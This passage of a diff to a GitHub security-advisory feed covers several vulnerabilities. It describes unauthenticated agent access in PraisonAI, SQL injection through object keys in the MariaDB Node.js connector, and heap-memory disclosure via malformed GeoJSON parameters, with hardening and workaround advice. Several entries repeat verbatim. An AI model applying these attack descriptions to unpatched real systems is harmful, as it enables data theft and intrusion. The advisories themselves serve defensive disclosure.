+<li>Default <code>host</code> to <code>127.0.0.1</code>; require <code>apiKey</code> (fail closed) when binding non-loopback.</li>
+<li>Do not default <code>corsOrigins</code> to <code>['*']</code>, especially with <code>Access-Control-Allow-Credentials: true</code>.</li>
+<li>Do not return full <code>instructions</code> on an unauthenticated endpoint.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6wjp-v33h-5cvq">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6wjp-v33h-5cvq</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61426">https://nvd.nist.gov/vuln/detail/CVE-2026-61426</a></li>
+<li><a href="https://www.vulncheck.com/advisories/praisonai-before-unauthenticated-agent-access-via-insecure-defaults">https://www.vulncheck.com/advisories/praisonai-before-unauthenticated-agent-access-via-insecure-defaults</a></li>
+<li><a href="https://github.com/advisories/GHSA-6wjp-v33h-5cvq">https://github.com/advisories/GHSA-6wjp-v33h-5cvq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6wjp-v33h-5cvq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-08T22:01:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[praisonai] Duplicate Advisory: PraisonAI: AgentOS defaults to network-exposed no-auth mode, allowing unauthenticated agent invocation and instruction disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-g3pq-3vvx-36w6</id>
+        <link href="https://github.com/advisories/GHSA-g3pq-3vvx-36w6"/>
+        <updated>2026-10-08T22:01:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-6wjp-v33h-5cvq. This link is maintained to preserve external references.</p>
+<h3 id="original-description">Original Description</h3>
+<p>PraisonAI before 1.7.3 contains an insecure default configuration that binds to all interfaces with no API key requirement and wildcard CORS. Unauthenticated attackers can call GET /api/agents to read agent instructions and system prompts, or POST /api/chat to invoke agents without authentication.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6wjp-v33h-5cvq">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6wjp-v33h-5cvq</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61426">https://nvd.nist.gov/vuln/detail/CVE-2026-61426</a></li>
+<li><a href="https://www.vulncheck.com/advisories/praisonai-before-unauthenticated-agent-access-via-insecure-defaults">https://www.vulncheck.com/advisories/praisonai-before-unauthenticated-agent-access-via-insecure-defaults</a></li>
+<li><a href="https://github.com/advisories/GHSA-g3pq-3vvx-36w6">https://github.com/advisories/GHSA-g3pq-3vvx-36w6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g3pq-3vvx-36w6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-11T15:30:23.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[music-metadata] music-metadata: MP4 stsd sample-entry size==0 causes a synchronous infinite loop (DoS) — unreleased regression on master]]></title>
         <id>https://github.com/advisories/GHSA-f94x-6692-553q</id>
@@ -717,580 +1902,5 @@ await parseBuffer(payload, { mimeType: 'video/webm' });
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-10-08T19:42:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js: SQL injection through object keys in SET expansion (permitSetMultiParamEntries)]]></title>
-        <id>https://github.com/advisories/GHSA-v6pj-gxxw-phfw</id>
-        <link href="https://github.com/advisories/GHSA-v6pj-gxxw-phfw"/>
-        <updated>2026-10-08T19:42:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>With the non-default permitSetMultiParamEntries option enabled, an object passed as a query parameter is expanded into a SET clause, each key becoming a column name. The three code paths implementing that expansion built the backtick-quoted identifier by hand and wrote the key out unescaped, while only the value was escaped.</p>
-<p>A key containing a backtick therefore closed the identifier, and the remainder of the key was parsed as SQL. The connector's own identifier escaper (escapeId, which correctly doubles backticks) existed but was not called from any of the three sites. This is an incomplete fix of GitHub issue #252, which corrected escapeId itself in 2023 but left these hand-built call sites unchanged.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that enables permitSetMultiParamEntries and passes an object with attacker-influenced keys into a statement such as conn.query('UPDATE users SET ? WHERE id = ?', [body, id]) allows the caller to write columns the application never intended to expose — a role, balance or password column — and to append arbitrary SQL to the statement, since the injected text is not confined to an assignment.</p>
-<p>Exposure requires the option to be enabled: it is off by default, and with it off the object is serialised and escaped as a single string literal, so the key never reaches the SQL grammar. Passing a request body into this API is, however, the ordinary reason to enable the option. An application that enables it is asking for keys to become column names, not for keys to become arbitrary SQL.</p>
-<h3 id="resolution">Resolution</h3>
-<p>All three expansion sites now route the key through the identifier escaper, doubling backticks before writing the column name. The feature is unchanged for legitimate keys, including reserved words.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable permitSetMultiParamEntries (the default), or validate object keys against an allow-list of column names before passing them to query(), until upgraded.</p>
-<h3 id="credit">Credit</h3>
-<p>Reported by fg0x0.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-v6pj-gxxw-phfw">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-v6pj-gxxw-phfw</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/144b8f4ef29539a9fb4b75d972b9dcdac4088b4e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/144b8f4ef29539a9fb4b75d972b9dcdac4088b4e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/6743b2f4a89b074268b44c650170767f35e1fb5d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/6743b2f4a89b074268b44c650170767f35e1fb5d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/8eb450972ff0f3826d7d45c071a42240798bc826">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/8eb450972ff0f3826d7d45c071a42240798bc826</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b9b04ec82a60b2caf2b0c038259ca9aff5d7014a">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b9b04ec82a60b2caf2b0c038259ca9aff5d7014a</a></li>
-<li><a href="https://hackerone.com/reports/3889198">https://hackerone.com/reports/3889198</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-369">https://jira.mariadb.org/browse/CONJS-369</a></li>
-<li><a href="https://github.com/advisories/GHSA-v6pj-gxxw-phfw">https://github.com/advisories/GHSA-v6pj-gxxw-phfw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v6pj-gxxw-phfw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js: SQL injection through object keys in SET expansion (permitSetMultiParamEntries)]]></title>
-        <id>https://github.com/advisories/GHSA-v6pj-gxxw-phfw</id>
-        <link href="https://github.com/advisories/GHSA-v6pj-gxxw-phfw"/>
-        <updated>2026-10-08T19:42:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>With the non-default permitSetMultiParamEntries option enabled, an object passed as a query parameter is expanded into a SET clause, each key becoming a column name. The three code paths implementing that expansion built the backtick-quoted identifier by hand and wrote the key out unescaped, while only the value was escaped.</p>
-<p>A key containing a backtick therefore closed the identifier, and the remainder of the key was parsed as SQL. The connector's own identifier escaper (escapeId, which correctly doubles backticks) existed but was not called from any of the three sites. This is an incomplete fix of GitHub issue #252, which corrected escapeId itself in 2023 but left these hand-built call sites unchanged.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that enables permitSetMultiParamEntries and passes an object with attacker-influenced keys into a statement such as conn.query('UPDATE users SET ? WHERE id = ?', [body, id]) allows the caller to write columns the application never intended to expose — a role, balance or password column — and to append arbitrary SQL to the statement, since the injected text is not confined to an assignment.</p>
-<p>Exposure requires the option to be enabled: it is off by default, and with it off the object is serialised and escaped as a single string literal, so the key never reaches the SQL grammar. Passing a request body into this API is, however, the ordinary reason to enable the option. An application that enables it is asking for keys to become column names, not for keys to become arbitrary SQL.</p>
-<h3 id="resolution">Resolution</h3>
-<p>All three expansion sites now route the key through the identifier escaper, doubling backticks before writing the column name. The feature is unchanged for legitimate keys, including reserved words.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable permitSetMultiParamEntries (the default), or validate object keys against an allow-list of column names before passing them to query(), until upgraded.</p>
-<h3 id="credit">Credit</h3>
-<p>Reported by fg0x0.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-v6pj-gxxw-phfw">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-v6pj-gxxw-phfw</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/144b8f4ef29539a9fb4b75d972b9dcdac4088b4e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/144b8f4ef29539a9fb4b75d972b9dcdac4088b4e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/6743b2f4a89b074268b44c650170767f35e1fb5d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/6743b2f4a89b074268b44c650170767f35e1fb5d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/8eb450972ff0f3826d7d45c071a42240798bc826">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/8eb450972ff0f3826d7d45c071a42240798bc826</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b9b04ec82a60b2caf2b0c038259ca9aff5d7014a">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b9b04ec82a60b2caf2b0c038259ca9aff5d7014a</a></li>
-<li><a href="https://hackerone.com/reports/3889198">https://hackerone.com/reports/3889198</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-369">https://jira.mariadb.org/browse/CONJS-369</a></li>
-<li><a href="https://github.com/advisories/GHSA-v6pj-gxxw-phfw">https://github.com/advisories/GHSA-v6pj-gxxw-phfw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v6pj-gxxw-phfw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js exposes uninitialized process memory through malformed GeoJSON parameters]]></title>
-        <id>https://github.com/advisories/GHSA-48qf-xh34-q73r</id>
-        <link href="https://github.com/advisories/GHSA-48qf-xh34-q73r"/>
-        <updated>2026-10-08T19:42:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When encoding a GeoJSON Polygon or MultiPolygon parameter for the binary protocol, the connector sized its output buffer from the length property of each ring, then wrote each ring only if it was a real array. The two loops disagreed: any non-array ring carrying a numeric length (a string, or an object such as {"length": 4000}) still reserved 4 + 16 * length bytes, but wrote none of them. The buffer came from Buffer.allocUnsafe() and was returned in full regardless of how far the write position had advanced, so every reserved-but-unwritten byte was uninitialized Node.js heap.</p>
-<p>The sibling LineString case handled this correctly, aborting with null on the first malformed point, so no reserved byte could escape unwritten.</p>
-<p>The only gate on this path is value.type naming a GeoJSON type, so any object shaped like {"type": "Polygon", ...} reached the encoder.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that passes an attacker-influenced object as a parameter to execute() or batch() writes uninitialized process memory into the database, where it is readable by anyone who can read that row and persists into backups and replicas. Applications accepting GeoJSON for map or location features are the natural case, as the attacker controls coordinates directly.</p>
-<p>The disclosed memory is not scoped to the requesting user: in a shared Node.js process the heap may hold other users' request and response bodies, session tokens and cookies, database credentials and TLS key material. The leak is silent — the insert succeeds and the column simply holds more bytes than it should.</p>
-<p>No non-default connector option and no particular server configuration are required. query() is not affected: the text encoder builds geometry as strings rather than through Buffer.allocUnsafe().</p>
-<h3 id="resolution">Resolution</h3>
-<p>Both the Polygon and MultiPolygon encoders now reject a non-array ring before reserving space for it, so no byte of the allocation can be left uninitialized by the writing loop, matching the existing LineString behaviour.</p>
-<h3 id=""></h3>
-<p>Workarounds
-Validate that GeoJSON coordinates are properly nested arrays of numbers before passing the object as a parameter, or use query(), until upgraded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-367">https://jira.mariadb.org/browse/CONJS-367</a></li>
-<li><a href="https://github.com/advisories/GHSA-48qf-xh34-q73r">https://github.com/advisories/GHSA-48qf-xh34-q73r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48qf-xh34-q73r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js exposes uninitialized process memory through malformed GeoJSON parameters]]></title>
-        <id>https://github.com/advisories/GHSA-48qf-xh34-q73r</id>
-        <link href="https://github.com/advisories/GHSA-48qf-xh34-q73r"/>
-        <updated>2026-10-08T19:42:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When encoding a GeoJSON Polygon or MultiPolygon parameter for the binary protocol, the connector sized its output buffer from the length property of each ring, then wrote each ring only if it was a real array. The two loops disagreed: any non-array ring carrying a numeric length (a string, or an object such as {"length": 4000}) still reserved 4 + 16 * length bytes, but wrote none of them. The buffer came from Buffer.allocUnsafe() and was returned in full regardless of how far the write position had advanced, so every reserved-but-unwritten byte was uninitialized Node.js heap.</p>
-<p>The sibling LineString case handled this correctly, aborting with null on the first malformed point, so no reserved byte could escape unwritten.</p>
-<p>The only gate on this path is value.type naming a GeoJSON type, so any object shaped like {"type": "Polygon", ...} reached the encoder.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that passes an attacker-influenced object as a parameter to execute() or batch() writes uninitialized process memory into the database, where it is readable by anyone who can read that row and persists into backups and replicas. Applications accepting GeoJSON for map or location features are the natural case, as the attacker controls coordinates directly.</p>
-<p>The disclosed memory is not scoped to the requesting user: in a shared Node.js process the heap may hold other users' request and response bodies, session tokens and cookies, database credentials and TLS key material. The leak is silent — the insert succeeds and the column simply holds more bytes than it should.</p>
-<p>No non-default connector option and no particular server configuration are required. query() is not affected: the text encoder builds geometry as strings rather than through Buffer.allocUnsafe().</p>
-<h3 id="resolution">Resolution</h3>
-<p>Both the Polygon and MultiPolygon encoders now reject a non-array ring before reserving space for it, so no byte of the allocation can be left uninitialized by the writing loop, matching the existing LineString behaviour.</p>
-<h3 id=""></h3>
-<p>Workarounds
-Validate that GeoJSON coordinates are properly nested arrays of numbers before passing the object as a parameter, or use query(), until upgraded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-367">https://jira.mariadb.org/browse/CONJS-367</a></li>
-<li><a href="https://github.com/advisories/GHSA-48qf-xh34-q73r">https://github.com/advisories/GHSA-48qf-xh34-q73r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48qf-xh34-q73r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js exposes uninitialized process memory through malformed GeoJSON parameters]]></title>
-        <id>https://github.com/advisories/GHSA-48qf-xh34-q73r</id>
-        <link href="https://github.com/advisories/GHSA-48qf-xh34-q73r"/>
-        <updated>2026-10-08T19:42:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When encoding a GeoJSON Polygon or MultiPolygon parameter for the binary protocol, the connector sized its output buffer from the length property of each ring, then wrote each ring only if it was a real array. The two loops disagreed: any non-array ring carrying a numeric length (a string, or an object such as {"length": 4000}) still reserved 4 + 16 * length bytes, but wrote none of them. The buffer came from Buffer.allocUnsafe() and was returned in full regardless of how far the write position had advanced, so every reserved-but-unwritten byte was uninitialized Node.js heap.</p>
-<p>The sibling LineString case handled this correctly, aborting with null on the first malformed point, so no reserved byte could escape unwritten.</p>
-<p>The only gate on this path is value.type naming a GeoJSON type, so any object shaped like {"type": "Polygon", ...} reached the encoder.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that passes an attacker-influenced object as a parameter to execute() or batch() writes uninitialized process memory into the database, where it is readable by anyone who can read that row and persists into backups and replicas. Applications accepting GeoJSON for map or location features are the natural case, as the attacker controls coordinates directly.</p>
-<p>The disclosed memory is not scoped to the requesting user: in a shared Node.js process the heap may hold other users' request and response bodies, session tokens and cookies, database credentials and TLS key material. The leak is silent — the insert succeeds and the column simply holds more bytes than it should.</p>
-<p>No non-default connector option and no particular server configuration are required. query() is not affected: the text encoder builds geometry as strings rather than through Buffer.allocUnsafe().</p>
-<h3 id="resolution">Resolution</h3>
-<p>Both the Polygon and MultiPolygon encoders now reject a non-array ring before reserving space for it, so no byte of the allocation can be left uninitialized by the writing loop, matching the existing LineString behaviour.</p>
-<h3 id=""></h3>
-<p>Workarounds
-Validate that GeoJSON coordinates are properly nested arrays of numbers before passing the object as a parameter, or use query(), until upgraded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-367">https://jira.mariadb.org/browse/CONJS-367</a></li>
-<li><a href="https://github.com/advisories/GHSA-48qf-xh34-q73r">https://github.com/advisories/GHSA-48qf-xh34-q73r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48qf-xh34-q73r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js exposes uninitialized process memory through malformed GeoJSON parameters]]></title>
-        <id>https://github.com/advisories/GHSA-48qf-xh34-q73r</id>
-        <link href="https://github.com/advisories/GHSA-48qf-xh34-q73r"/>
-        <updated>2026-10-08T19:42:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When encoding a GeoJSON Polygon or MultiPolygon parameter for the binary protocol, the connector sized its output buffer from the length property of each ring, then wrote each ring only if it was a real array. The two loops disagreed: any non-array ring carrying a numeric length (a string, or an object such as {"length": 4000}) still reserved 4 + 16 * length bytes, but wrote none of them. The buffer came from Buffer.allocUnsafe() and was returned in full regardless of how far the write position had advanced, so every reserved-but-unwritten byte was uninitialized Node.js heap.</p>
-<p>The sibling LineString case handled this correctly, aborting with null on the first malformed point, so no reserved byte could escape unwritten.</p>
-<p>The only gate on this path is value.type naming a GeoJSON type, so any object shaped like {"type": "Polygon", ...} reached the encoder.</p>
-<h3 id="impact">Impact</h3>
-<p>An application that passes an attacker-influenced object as a parameter to execute() or batch() writes uninitialized process memory into the database, where it is readable by anyone who can read that row and persists into backups and replicas. Applications accepting GeoJSON for map or location features are the natural case, as the attacker controls coordinates directly.</p>
-<p>The disclosed memory is not scoped to the requesting user: in a shared Node.js process the heap may hold other users' request and response bodies, session tokens and cookies, database credentials and TLS key material. The leak is silent — the insert succeeds and the column simply holds more bytes than it should.</p>
-<p>No non-default connector option and no particular server configuration are required. query() is not affected: the text encoder builds geometry as strings rather than through Buffer.allocUnsafe().</p>
-<h3 id="resolution">Resolution</h3>
-<p>Both the Polygon and MultiPolygon encoders now reject a non-array ring before reserving space for it, so no byte of the allocation can be left uninitialized by the writing loop, matching the existing LineString behaviour.</p>
-<h3 id=""></h3>
-<p>Workarounds
-Validate that GeoJSON coordinates are properly nested arrays of numbers before passing the object as a parameter, or use query(), until upgraded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-48qf-xh34-q73r</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/2314c03b785db482599d2befd06f4992e5fc46b3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/a4aa048b57dc47309b80e5cc25a4a8eedb32fd9f</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/b2ca628864b0fc2e3e94ea96910f6b693ad5bd30</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/faa27d1b2b7753a54000f586d5148089b60d1284</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.5</a></li>
